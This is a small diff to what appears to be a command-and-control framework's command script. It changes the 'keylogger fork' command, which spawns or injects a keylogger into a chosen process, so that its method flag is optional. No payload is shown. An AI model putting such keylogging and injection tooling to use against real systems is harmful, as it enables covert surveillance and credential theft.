@@ -143,7 +143,7 @@ cmd_dotnet.addSubCommands([cmd_dotnet_list_v, cmd_dotnet_inline, cmd_dotnet_fork
 // KEYLOGGER
 
 let cmd_keylogger_fork = ax.create_command("fork", "Execute Keylogger in-process spawning or injecting in the existence process", "keylogger fork -m spawn", "Task: execute Keylogger");
-cmd_keylogger_fork.addArgFlagString("-m", "fork_method", true, "Method to use fork, choice 'explicit' need use fork_pid or 'spawn'");
+cmd_keylogger_fork.addArgFlagString("-m", "fork_method", false, "Method to use fork, choice 'explicit' need use fork_pid or 'spawn'");
 cmd_keylogger_fork.addArgFlagInt("-P", "fork_pid", false, "Pid to use for inject in the explicit method");
 cmd_keylogger_fork.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     let fork_method = parsed_json["fork_method"];
